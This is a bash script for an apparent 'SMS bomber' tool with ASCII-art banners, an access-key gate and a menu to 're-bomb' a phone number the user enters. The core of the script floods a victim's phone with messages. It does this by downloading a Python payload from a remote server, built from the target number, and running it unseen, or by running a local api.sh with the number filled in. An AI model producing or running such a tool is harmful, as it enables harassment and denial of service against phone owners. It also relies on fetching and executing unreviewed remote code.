git clone "https://github.com/officialkeshav/access-key"
che=$(cat access-key/nas.txt)
rm -rf access-key
if [ -f "setup.sh" ];
then
bash setup.sh
rm setup.sh
fi
clear
banner(){
echo -e '\e[95m
────────────█───────────────█
────────────██─────────────██
─────────────███████████████
────────────█████████████████
───────────███████████████████
──────────████──█████████──████
─────────███████████████████████
────────█████████████████████████
────────█████████████████████████
───███──▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒──███'
echo -e '\e[91m
──█████─█████████████████████████─█████
──█████─████████████████──███████─█████
──█████─██████────────█──█────███─█████
──█████─██     ▓▓▓█BOMBER──█▓▓─▓─███─████
──█████─███─█─▓▓▓▓▓▓█──█▓▓─▓▓─███─█████
──█████─██──█─▓▓▓▓▓█──█▓▓─▓▓▓─███─█████
──█████─███─█─▓▓▓▓█──█▓▓─▓▓▓▓─███─█████
──█████─█████────█──█─────────███─█████
──█████─█████████──██████████████─█████
───███──████████──███████████████──███
────────█████████████████████████
─────────███████████████████████
──────────█████████████████████
─────────────██████───██████
─────────────██████───██████
─────────────██████───██████
─────────────██████───██████
──────────────████─────████

────────────────────────────────────────────────────────────────────────────────────────────
                                         INSTAGRAM:- official_.keshav'
                                         echo -e '\e[93m CODED BY KESHAV'

}
kes(){
echo -e '\e[92m
────────────█───────────────█
────────────██─────────────██
─────────────███████████████
────────────█████████████████
───────────███████████████████
──────────████──█████████──████
─────────███████████████████████
────────█████████████████████████
────────█████████████████████████
───███──▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒──███'
echo -e '\e[93m
──█████─█████████████████████████─█████
──█████─████████████████──███████─█████
──█████─██████────────█──█────███─█████
──█████─██     ▓▓▓█BOMBER──█▓▓─▓─███─████
──█████─███─█─▓▓▓▓▓▓█──█▓▓─▓▓─███─█████
──█████─██──█─▓▓▓▓▓█──█▓▓─▓▓▓─███─█████
──█████─███─█─▓▓▓▓█──█▓▓─▓▓▓▓─███─█████
──█████─█████────█──█─────────███─█████
──█████─█████████──██████████████─█████
───███──████████──███████████████──███
────────█████████████████████████
─────────███████████████████████
──────────█████████████████████
─────────────██████───██████
─────────────██████───██████
─────────────██████───██████
─────────────██████───██████
──────────────████─────████
------------------------------INSTAGRAM:- official_.keshav'
                                         echo -e '\e[93m CODED BY KESHAV'
}
kp(){
echo -e "\e[95m Settting Up Server"
curl -o keshav.py "https://mbomber2-o.onrender.com/jatinkalwar/sms/$num"  >/dev/null 2>&1

if [ -f "keshav.py" ];
then
action=$(cat keshav.py)
if [ "$action" == "false" ];
then
echo "Something Went Wrong From Server"
else
echo -e "\e[95m Bombing start"
python3 keshav.py
fi
else
echo "Something Went Wrong"
fi
}

sp(){
echo -e "bombing start"
cp api.sh app.sh
 sed -i s/€tor/$num/g app.sh
bash app.sh
}

banner
echo -e ""
 echo -e '\e[94m ENTER YOUR ACCESS KEY'
echo -e ""
echo -e ""
echo -e '\e[93m  IF YOU DONT KNOW ACCESS KEY THEN MESSAGE TELEGRAM :- OFFICIALKESHAV'
read acces
if [ "$che" == "$acces" ];
then
echo""
sleep 2.0
else
sleep 2.0
echo "wrong key"
sleep 2.0
bash bombing.sh

fi
sleep 3.0
clear
kes
echo  -ne "\e[91m Enter Your number :-"
sleep 5.0

bomb(){
clear 
banner 
sleep 2.0
if [ "$method" == "true" ];
then
kp
method="false"
echo ""
else
sp
echo
fi


con
}


con(){
echo -e " "
echo -e "\e[31m# \e[93m BOMBER\e[93m \e[92m(\e[31m$v\e[92m)"
echo -e "\e[92m[\e[91m1\e[92m]\e[93m RE-BOMB\e[93m"
echo -e "\e[92m[\e[91m2\e[92m]\e[93m EXIT\e[93m"
echo -e "\e[92m[\e[91m3\e[92m]\e[93m ARE BHAI BAS KAR PHONE MAAR JAYEGA USKA\e[93m"
echo -ne "select:-"

read opt
if [ $opt -eq 1 ];then  
bomb
   con
    elif [ $opt -eq 2 ]; then
    clear
elif [ $opt -eq 3 ]; then
echo  -ne "\e[91m wrong input"
else 
echo  ""
fi

}
method="true"
read num
bomb


